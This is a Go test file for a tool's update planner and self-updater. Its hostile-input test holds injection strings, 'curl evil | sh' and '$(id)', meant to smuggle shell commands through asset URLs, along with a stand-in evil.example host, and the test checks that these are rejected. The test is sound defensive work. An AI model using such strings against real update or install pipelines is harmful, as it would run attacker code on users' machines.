package updates

import (
	"strings"
	"testing"

	"github.com/dev1antdev/remuda/internal/health"
)

func TestPlan(t *testing.T) {
	r := &health.Report{Claude: "2.1.285", ClaudeVia: "brew", Codex: "0.160.0", CodexVia: "npm", Herdr: "0.9.1", HerdrVia: "installer"}
	if u, err := Plan("claude", r); err != nil || !strings.Contains(u.Command, "brew update && brew upgrade claude-code") {
		t.Fatalf("claude: %+v %v", u, err)
	}
	if u, err := Plan("codex", r); err != nil || !strings.Contains(u.Command, "@openai/codex@latest") {
		t.Fatalf("codex: %+v %v", u, err)
	}
	if u, err := Plan("herdr", r); err != nil || !strings.Contains(u.Command, "herdr update --handoff") {
		t.Fatalf("herdr: %+v %v", u, err)
	}
	if _, err := Plan("gemini", r); err == nil {
		t.Fatal("gemini is not installed")
	}
	if u, err := Plan("agents", r); err != nil || !strings.Contains(u.Command, "Update Claude Code") || strings.Contains(u.Command, "Gemini") {
		t.Fatalf("agents: %+v %v", u, err)
	}
	if u, _ := Plan("agents", r); strings.Count(u.Command, "brew update ||") != 1 || strings.Contains(u.Command, "brew update && brew upgrade") {
		t.Fatalf("agents: brew update once, up front: %s", u.Command)
	}
	if u, _ := Plan("herdr", &health.Report{Herdr: "0.9.3", HerdrVia: "brew"}); !strings.Contains(u.Command, "brew update && brew upgrade herdr && herdr --version\n#") {
		t.Fatalf("herdr brew: %s", u.Command)
	}
	if ups := Offered(&health.Report{Herdr: "0.9.3", HerdrVia: "installer", HerdrServer: "0.9.1"}, health.Latest{}); len(ups) != 1 || !strings.HasPrefix(ups[0].Note, "The server runs 0.9.1 while 0.9.3 is installed.") {
		t.Fatalf("server note: %+v", ups)
	}
	ups := Offered(r, health.Latest{Claude: "2.1.296", Herdr: "0.9.3"})
	if len(ups) != 3 || !strings.Contains(ups[0].Note, "0.9.1 → 0.9.3") || !strings.Contains(ups[1].Note, "→ 2.1.296") {
		t.Fatalf("updates: %+v", ups)
	}
}

func TestAssetName(t *testing.T) {
	for _, c := range []struct{ os, arch, want string }{
		{"macOS 26.6.2", "arm64", "remuda-darwin-arm64"},
		{"darwin", "arm64", "remuda-darwin-arm64"},
		{"Linux 6.8.0-45-generic", "amd64", "remuda-linux-amd64"},
		{"linux", "arm64", "remuda-linux-arm64"},
		{"Windows", "amd64", ""},
		{"macOS 26.6.2", "", ""},
		{"", "arm64", ""},
	} {
		if got := AssetName(c.os, c.arch); got != c.want {
			t.Errorf("AssetName(%q, %q) = %q, want %q", c.os, c.arch, got, c.want)
		}
	}
}

func release(tag string, assets map[string]string, checksums string) health.Release {
	return health.Release{Tag: tag, Version: strings.TrimPrefix(tag, "v"), Assets: assets, Checksums: checksums}
}

func TestReleaseUpdate(t *testing.T) {
	download := "https://github.com/dev1antdev/remuda/releases/download/v0.5.0/"
	rel := release("v0.5.0", map[string]string{"remuda-darwin-arm64": download + "remuda-darwin-arm64", "remuda-linux-amd64": download + "remuda-linux-amd64"}, download+"checksums.txt")
	u, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "macOS 26.6.2", "arm64", rel, false)
	if !ok || u.What != "remuda-release" || u.Title != "Download & install remuda v0.5.0" {
		t.Fatalf("remote: %+v %v", u, ok)
	}
	for _, want := range []string{
		`curl -fsSL --retry 3 -o "$HOME/.local/bin/remuda.new" 'https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64'`,
		`/v0.5.0/checksums.txt`,
		`awk -v n='remuda-darwin-arm64'`,
		`mv "$HOME/.local/bin/remuda.new" "$HOME/.local/bin/remuda"`,
		`launchctl kickstart -k`,
	} {
		if !strings.Contains(u.Command, want) {
			t.Errorf("remote command lacks %q:\n%s", want, u.Command)
		}
	}
	if strings.Contains(u.Command, "sleep 2") {
		t.Error("a remote restart is not delayed")
	}
	if !strings.Contains(u.Note, "v0.4.0-24-g5dac31e → v0.5.0") || !strings.Contains(u.Note, "checksums") || strings.Contains(u.Note, "serving this page") {
		t.Errorf("remote note: %s", u.Note)
	}
	l, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "darwin", "arm64", rel, true)
	if !ok || !strings.Contains(l.Command, "sleep 2") || !strings.Contains(l.Command, "launchctl print") || !strings.Contains(l.Note, "serving this page") {
		t.Fatalf("local: %+v", l)
	}
	if _, ok := ReleaseUpdate("v0.5.0", "darwin", "arm64", rel, false); ok {
		t.Error("the same version was offered")
	}
	if _, ok := ReleaseUpdate("v0.5.0-3-gabc1234", "darwin", "arm64", rel, false); ok {
		t.Error("a build past the release was offered the release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "macOS 26.6.2", "amd64", rel, false); ok {
		t.Error("a platform without an asset was offered")
	}
	if _, ok := ReleaseUpdate("", "darwin", "arm64", rel, false); ok {
		t.Error("a machine without remuda was offered a release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", health.Release{}, false); ok {
		t.Error("no release known, yet offered")
	}
	for _, bad := range []string{
		`https://evil.example/remuda-darwin-arm64`,
		`https://github.com/someone/else/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.4.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x"; curl evil | sh; echo "`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x'; curl evil | sh; echo '`,
		`http://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64?x=$(id)`,
	} {
		hostile := release("v0.5.0", map[string]string{"remuda-darwin-arm64": bad}, "")
		if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", hostile, false); ok {
			t.Errorf("a release with asset URL %q was offered", bad)
		}
	}
	old := release("v0.6.0", map[string]string{"remuda-darwin-arm64": "https://github.com/dev1antdev/remuda/releases/download/v0.6.0/remuda-darwin-arm64"}, "")
	n, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", old, false)
	if !ok || !strings.Contains(n.Command, "not verified") || strings.Contains(n.Command, "awk") || !strings.Contains(n.Note, "no checksums.txt") {
		t.Fatalf("no checksums: %+v", n)
	}
}
